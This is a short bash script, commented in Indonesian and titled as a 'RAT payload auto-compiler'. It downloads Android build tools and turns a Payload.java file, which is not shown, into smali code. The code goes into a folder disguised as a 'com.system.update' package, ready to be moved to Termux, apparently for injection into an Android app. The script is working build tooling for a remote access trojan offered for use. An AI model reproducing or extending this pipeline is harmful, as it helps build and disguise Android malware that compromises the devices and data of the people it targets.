#!/bin/bash

echo "======================================"
echo "   RAT PAYLOAD AUTO-COMPILER (JAVA->SMALI) "
echo "======================================"

# 1. Cek Wget (buat download)
if ! command -v wget &> /dev/null; then
    echo "[!] Wget tidak ditemukan, menginstall..."
    sudo apt install wget -y
fi

# 2. Cek Java (buat compile)
if ! command -v javac &> /dev/null; then
    echo "❌ GAGAL: Java (JDK) tidak ditemukan."
    echo "Jalankan: sudo apt install default-jdk -y"
    exit 1
fi

# 3. Bikin folder kerja
mkdir -p payload_src/com/system/update
mkdir -p payload_smali
cd payload_src/com/system/update

# Bersihkan file class lama biar ga bentrok
rm -f *.class classes.dex

# 4. Download Alat (Kalau belum ada)
if [ ! -f r8.jar ]; then
    echo "[~] Mendownload R8/D8 Compiler dari Google Maven..."
    wget -q https://maven.google.com/com/android/tools/r8/3.3.28/r8-3.3.28.jar -O r8.jar
fi

if [ ! -f baksmali.jar ]; then
    echo "[~] Mendownload Baksmali..."
    wget -q https://github.com/baksmali/smali/releases/download/v2.5.2/baksmali-2.5.2.jar -O baksmali.jar
fi

if [ ! -f android.jar ]; then
    echo "[~] Mendownload Android SDK (android.jar)..."
    wget -q https://github.com/Sable/android-platforms/raw/master/android-30/android.jar
fi

# 5. Compile Java ke .class (PAKAI --release 8)
echo "[~] Mengcompile Payload.java..."
javac -cp "android.jar:." --release 8 Payload.java
if [ $? -ne 0 ]; then
    echo "❌ GAGAL: Error saat javac."
    exit 1
fi

# 6. Ubah .class ke .dex (PAKAI *.class)
echo "[~] Mengubah ke format Android (.dex)..."
java -cp r8.jar com.android.tools.r8.D8 --lib android.jar *.class --output .
if [ $? -ne 0 ]; then
    echo "❌ GAGAL: Error saat mengubah ke DEX."
    exit 1
fi

# 7. Ubah .dex ke .smali
echo "[~] Mengubah ke Smali..."
java -jar baksmali.jar d classes.dex -o smali_out
if [ $? -ne 0 ]; then
    echo "❌ GAGAL: Error saat mengubah ke Smali."
    exit 1
fi

# 8. Pindahin hasilnya
echo "[~] Memindahkan file Smali ke folder Bot..."
cp -r smali_out/com ../../../../payload_smali/

echo "======================================"
echo " ✅ COMPILE SUKSES! "
echo " Folder 'payload_smali' siap dipindah ke Termux."
echo "======================================"
